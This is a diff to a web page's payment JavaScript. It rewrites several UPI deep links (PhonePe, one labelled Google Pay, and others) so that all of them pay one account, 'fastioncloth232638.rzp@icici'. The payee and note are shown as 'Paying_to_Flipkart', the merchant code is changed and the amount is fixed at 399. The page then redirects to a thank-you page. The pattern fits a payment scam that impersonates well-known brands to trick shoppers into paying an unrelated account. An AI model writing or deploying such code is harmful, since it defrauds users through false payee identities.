@@ -960,7 +960,7 @@
 
         function openPhonePePayment() {
             const amount = getAmountFromURL(); // Get amount from ?amount=
-            const phonePeURL = `phonepe://pay?pa=fastioncloth232638.rzp@icici&pn=Shopify&tn=Clothing%20Payment&am=100&cu=INR&mc=8241&qrMedium=04`;
+            const phonePeURL = `phonepe://pay?ver=01&mode=19&pa=fastioncloth232638.rzp@icici&pn=Paying_to_Flipkart&tr=Mairtel&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=399`;
             window.location.href = phonePeURL;
              window.location.href = upiLink;
              // After 9 seconds, redirect to thank-you page
@@ -978,7 +978,7 @@
 
         function openMoreUPIPayment() {
             const amount = getAmountFromURL();
-            const upiLink = `phonepe://pay?pa=fastioncloth232638.rzp@icici&pn=Shopify&tn=&am=${amount}&tr&cu=INR&mc=8241&qrMedium=04`;
+            const upiLink = `phonepe://pay?ver=01&mode=19&pa=fastioncloth232638.rzp@icici&pn=Paying_to_Flipkart&tr=Mairtel&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=399`;
             window.location.href = upiLink;
              window.location.href = upiLink;
              // After 9 seconds, redirect to thank-you page
@@ -1014,7 +1014,7 @@
 
         function openGooglePayPayment() {
             const amount = getAmountFromURL();
-            const gpayLink = `phonepe://pay?pa=fastioncloth232638.rzp@icici&pn=Shopify&tn=&am=${amount}&tr&cu=INR&mc=8241&qrMedium=04`;
+            const gpayLink = `phonepe://pay?ver=01&mode=19&pa=fastioncloth232638.rzp@icici&pn=Paying_to_Flipkart&tr=Mairtel&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=399`;
             window.location.href = gpayLink;
              window.location.href = upiLink;
              // After 9 seconds, redirect to thank-you page
@@ -1043,7 +1043,7 @@
                 return;
             }
 
-            const upiLink = `phonepe://pay?pa=fastioncloth232638.rzp@icici&pn=Shopify&tn=&am=${amount}&tr&cu=INR&mc=8241&qrMedium=04`;
+            const upiLink = `phonepe://pay?ver=01&mode=19&pa=fastioncloth232638.rzp@icici&pn=Paying_to_Flipkart&tr=Mairtel&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=399`;
             window.location.href = upiLink;
              // After 9 seconds, redirect to thank-you page
     setTimeout(() => {
